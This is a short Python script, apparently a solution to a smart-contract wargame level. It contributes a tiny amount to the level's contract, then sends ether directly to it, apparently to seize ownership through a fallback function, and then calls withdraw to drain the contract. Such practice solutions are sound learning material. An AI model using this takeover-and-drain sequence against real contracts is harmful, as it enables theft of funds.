from scripts.level_helper import setup_instance

@setup_instance
def main(instance, player, attack):
    instance.contribute({'from': player, 'value': '0.0001 ether'})
    player.transfer(to=instance, amount='1 ether')
    instance.withdraw({'from': player})

